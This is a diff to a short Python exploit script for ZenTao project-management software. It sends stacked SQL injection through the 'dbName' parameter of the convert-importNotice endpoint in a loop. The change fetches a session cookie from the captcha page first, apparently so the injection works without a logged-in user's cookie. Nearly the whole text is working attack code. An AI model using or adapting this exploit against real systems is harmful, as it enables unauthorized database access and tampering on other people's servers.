@@ -1,7 +1,8 @@
-import requests, gnureadline
+import requests
 
-url = input("Please input index url (eg. http://xxx/zentaopms/www/index.php): ")
-zentaosid = input("Please input zentaosid (you can get this from cookie): ")
+url = input("Please input root url (eg. http://xxx/zentaopms/www/): ")
+
+s = requests.session()
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42"
@@ -13,6 +14,7 @@ while True:
     data = {
         "dbName": "test'; "+sql + "# "
     }
-    requests.post(url+"convert-importNotice.html?zentaosid="+zentaosid, headers=headers, cookies=cookies, data=data)
-    requests.post(url+"?m=convert&f=importNotice&zentaosid="+zentaosid, headers=headers, cookies=cookies, data=data)
+    s.get(url+"misc-captcha-user.html")
+    s.post(url+"convert-importNotice.html?zentaosid="+s.cookies['zentaosid'], headers=headers, data=data)
+    s.post(url+"?m=convert&f=importNotice&zentaosid="+s.cookies['zentaosid'], headers=headers, data=data)
     print("Exec success (on echo).")
